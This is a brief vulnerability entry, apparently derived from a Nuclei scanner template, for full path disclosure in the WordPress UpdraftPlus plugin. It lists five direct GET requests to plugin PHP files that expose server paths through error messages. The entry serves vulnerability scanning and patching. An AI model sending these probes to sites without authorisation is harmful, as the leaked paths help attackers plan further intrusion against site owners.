# Vulnerability: WordPress UpdraftPlus - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-updraftplus-fpd.yaml`)

## Description
WordPress Plugin UpdraftPlus files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/updraftplus/admin.php
GET {{BaseURL}}/wp-content/plugins/updraftplus/class-updraftplus.php
GET {{BaseURL}}/wp-content/plugins/updraftplus/restorer.php
GET {{BaseURL}}/wp-content/plugins/updraftplus/backup.php
GET {{BaseURL}}/wp-content/plugins/updraftplus/includes/class-commands.php
```

